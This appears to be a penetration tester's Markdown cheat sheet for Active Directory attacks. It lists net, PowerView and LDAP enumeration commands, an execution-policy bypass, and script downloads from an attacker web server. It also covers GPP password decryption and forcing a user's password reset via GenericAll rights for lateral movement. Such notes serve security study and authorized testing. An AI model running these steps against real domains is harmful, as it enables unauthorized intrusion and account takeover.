## AD Permission Types
```
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```
## Do this whenever you get a new user!!
```
Display users in domain
net user /domain
net user [username] /domain (to check for specific user)
-----------------------------------------------------
Display groups in domain
net group /domain
net group "Group Name" /domain (to check specific group and its members)
-----------------------------------------------------
Displaying SPNs linked to user account
setspn -L [username]
------------------------------------------------------
Domain Class and GetCurrentDomain (Powershell)
powershell -ep bypass (IMPORTANT!!!)
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-----------------------------------------------------
EITHER

Best way to do this is to run penumeration.ps1 script in ~/Documents/tools, to get the file, just start web server and iwr -uri http://$ip/enumeration.ps1 -Outfile enumeration.ps1

Improving upon enumeration.ps1:
now there is search function, script file is called function.ps1

iwr -uri http://$ip/function.ps1 -Outfile function.ps1

to run, Import-Module .\function.ps1
Syntaxes:
LDAPSearch -LDAPQuery "(samAccountType=805306368)" [enumerate all users in domain]
LDAPSearch -LDAPQuery "(objectclass=group)" [List all Groups in domain]

foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
$group.properties | select {$_.cn}, {$_.member}
} [enumerate every group available as well as displaying user members]

Nested Groups, if discovered
$nested = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Group Name))"

To view, $nested.properties.member
repeat process until there is no remaining nested groups
```

OR
## Run PowerView.ps1
```
first, Import-Module .\PowerView.ps1

Syntax:
Get-NetDomain (obtain domain information)
Get-NetUser (obtaining all user information in the domain) | select cn,pwdlastset,lastlogon (cn=username,pwdlastset=time of when password was last set, lastlogon= time of when user last logon)
Get-NetGroup (obtaining all groups information in the domain) | select cn
Get-NetGroup "Group Name" | select member
-------------------------------------------------
Enumerating Operating Systems
Get-NetComputer (obtain all computer objects in the domain) | select operatingsystem,dnshostname
--------------------------------------------------
Finding Local Admin Privileges
Find-LocalAdminAccess
----------------------------------------------------
Checking for Logged on Users
Get-NetSession -ComputerName [name] -Verbose
----------------------------------------------------
Listing Service Accounts
Get-NetUser -SPN | select samaccountname,serviceprincipalname
-----------------------------------------------------
Enumerating Access Control Entries
Get-ObjectAcl -Identity [username]

Get-ObjectAcl -Identity "Group Name" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
-----------------------------------------------------
Converting ObjectSID into name
Convert-SidToName [SID]
-----------------------------------------------------
Querying Domain Shares
Find-DomainShare
```

## PsLoggedOn
```
Used to check any users who are logged on, can be potentially used to steal credentials

.\PsLoggedon.exe \\[name of computer]
```
## Listing Contents of a share
```
ls \\[ComputerName]\[Name]\[DomainName]
```
## Decrypting GPP-stored passwords
```
gpp-decrypt "password" [run in kali]
```
## Move this to lateral movement probably
```
Changing Password for User (GenericAll ACL)
Set-DomainUserPassword -Identity [username] -AccountPassword (ConvertTo-SecureString -AsPlainText "Password123@" -Force)

After changing, do runas /user:[domain\username] cmd.exe

Once cmd launched, run Powershell, import Powerview.ps1 and then Find-LocalAdminAccess
```